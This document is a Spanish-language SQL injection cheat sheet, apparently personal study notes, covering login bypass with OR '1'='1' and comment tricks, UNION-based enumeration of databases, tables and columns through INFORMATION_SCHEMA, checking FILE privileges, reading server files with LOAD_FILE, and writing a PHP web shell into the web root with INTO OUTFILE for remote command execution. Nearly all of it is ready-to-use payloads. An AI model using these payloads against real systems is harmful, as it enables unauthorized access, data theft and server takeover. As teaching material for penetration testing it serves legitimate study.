
## Básico

-Consulta inicial
```
SELECT * FROM logins WHERE username=''' AND password='cualquiera';

```
-SQLi
```
SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password='cualquiera';
```
-Si no sabes el usuario
```
SELECT * FROM logins WHERE username='loquesea' OR '1'='1' AND password='algo' OR '1'='1';
```
te loggea como el primer usuario de la tabla(usualmente admin)

## Comentarios

-Bypass con comentario
```
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'algo';
```
IMPORTANTE: el comentario -- tiene que tener un espacio después, te puedes asegurar de ello usando -- -

## UNION

Te hace un mezcladillo con las dos tablas que le des, interesante cuando quieres leer info de otras tablas

-REQUISITOS: la tabla inicial con la tabla aderida con el union tienen que tener el mismo numero de columnas, si no dará error

-unión de tablas ports y ships
```
SELECT * FROM ports UNION SELECT * FROM ships;
```

-Si no sabes que tipo de dato almacena las columnas es mejor usas NULL pues se adapta a todas, y para saber cuantas columnas hay es bueno hacer union e ir probando un numero hasta que deje de dar error
```
UNION SELECT username, NULL, NULL, NULL FROM passwords-- - 
```
## DATABASE ENUMERATION

para saber en que base de datos estamos usar : database()
### Fingerprinting

![Uploading image.png…]()


### INFORMATION_SCHEMA

`INFORMATION_SCHEMA` es una **base de datos especial** que contiene metadatos (nombres de tablas, columnas, etc.) de **todas las bases de datos** del servidor.

Pero como está en otra base de datos, para acceder a sus tablas usamos el operador **`.`** (punto).  
Ejemplo:
```
SELECT * FROM my_database.users;
```

### SCHEMATA

Contiene todas las bases de datos. Para verlas:
```
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

### TABLES

La tabla `INFORMATION_SCHEMA.TABLES` contiene **una fila por cada tabla** que existe en **todas las bases de datos** del servidor.

```
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'clientes_db';
```


### COLUMNS

La tabla `INFORMATION_SCHEMA.COLUMNS` contiene información sobre **todas las columnas** de todas las tablas en todas las bases de datos.

```
SELECT COLUMN_NAME
FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'usuarios' AND TABLE_SCHEMA = 'clientes_db';
```

## Lectura de archivos

### Privilegios necesarios

En MySQL y MaríaDB necesitas de los privilegios 'FILE', para comprobarlo:
```
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

### que usuario soy ? 

```
cn' UNION SELECT 1, USER(), 3, 4-- -
```

### Leer archivo

```
SELECT LOAD_FILE('/ruta/al/archivo');
```

## Escritura en archivos (RCE) 

(epico para web shell )

### Permisos necesarios

-FILE:
```
SELECT privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"
```
-secure_file_priv
```
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

- **Si devuelve NULL** → no puedes leer ni escribir archivos.
- **Si devuelve vacío** (`""`) → puedes leer/escribir en todo el sistema.
- **Si devuelve una ruta** (ej. `/var/lib/mysql-files`) → solo puedes escribir ahí.

### Web shell

-Payload
```
<?php system($_REQUEST[0]); ?>
```
-SQLi
```
cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```
-Luego puedes hacer:
```
http://target/shell.php?0=id
```
